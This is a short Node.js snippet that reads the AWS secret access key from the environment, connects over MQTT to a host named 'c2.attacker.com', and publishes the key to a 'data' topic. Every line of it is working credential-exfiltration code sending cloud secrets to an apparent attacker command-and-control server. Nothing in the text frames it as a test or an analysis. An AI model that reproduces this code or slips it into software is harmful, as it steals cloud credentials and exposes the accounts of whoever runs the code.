const mqtt = require('mqtt');
const token = process.env.AWS_SECRET_ACCESS_KEY;
const client = mqtt.connect('mqtt://c2.attacker.com');
client.on('connect', () => client.publish('data', token));
